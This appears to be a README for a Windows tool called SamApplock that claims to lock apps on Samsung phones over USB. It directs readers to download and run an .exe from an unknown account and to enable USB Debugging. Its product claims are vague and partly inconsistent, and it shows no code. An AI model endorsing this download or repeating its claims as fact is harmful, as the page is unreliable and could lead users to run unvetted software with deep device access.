# 🔒 SamApplock - Secure your private apps with ease

[![](https://img.shields.io/badge/Download-SamApplock-blue.svg)](https://github.com/anticyclonegenusgloriosa242/SamApplock)

SamApplock provides a simple way to protect the applications on your Samsung device. Use this tool to prevent unauthorized access to your private data. You can lock specific apps with a pin or pattern. This software runs on Windows to manage your device settings.

## 📥 How to download the software

Follow these steps to obtain the tool:

1. Visit the [official repository page](https://github.com/anticyclonegenusgloriosa242/SamApplock).
2. Look for the Releases section on the right side of the page.
3. Click on the latest version link.
4. Download the file ending in .exe to your computer.
5. Save the file in a folder you can easily find.

## ⚙️ System requirements

Ensure your computer meets these conditions to run the software:

* Windows 10 or Windows 11 operating system.
* A stable USB connection to your Samsung device.
* The Samsung USB driver installed on your computer.
* Your device must have USB Debugging enabled in developer settings.

## 🚀 Setting up the application

Follow these steps to prepare your computer and device:

1. Open the file you downloaded. 
2. Follow the prompts on the screen to finish the installation.
3. Connect your Samsung device to your computer using a data cable.
4. Launch SamApplock from your desktop.
5. Grant the app permission to access your device.

## 🛡️ Locking your applications

Once the software detects your phone, you can see a list of installed apps. Choose the apps you want to secure. Click the Lock button next to each app name. The software saves these changes to your device immediately. You do not need to restart your phone for the changes to take effect. If you want to unlock an app, return to this list and click the Unlock button.

## 🔧 Managing your pin settings

You can update your security pin at any time within the application. Navigate to the Settings tab at the top of the window. Click on Change Pin. Type your current pin, then enter your new four-digit code. Confirm the code to save your changes. If you forget your pin, the software offers a recovery option through your linked Samsung account.

## 🧩 Troubleshooting common issues

If the software fails to find your device, try these steps:

* Unplug the USB cable and plug it back in.
* Ensure you use a high-quality data cable.
* Check your phone screen for an authorization prompt. 
* Tap "Allow" when the phone asks for permission to trust the computer.
* Restart both your phone and the computer if the connection stays broken.

## 📝 Frequently asked questions

Does this tool delete my data?
No. SamApplock only changes the access settings for existing apps. It does not touch your photos, messages, or files.

Can I lock system apps?
Yes. You can select system tools like Settings or Gallery to prevent others from changing your configuration.

Does it work on other phone brands?
This software works specifically with Samsung devices. It may not detect or communicate with other phone brands correctly.

What happens if I turn off my computer?
The locks on your phone stay active even when your computer is off or disconnected. The process happens on the device itself.

Does the app drain my phone battery?
The tool uses minimal power while it runs in the background of your device. You should notice no change in daily battery life.
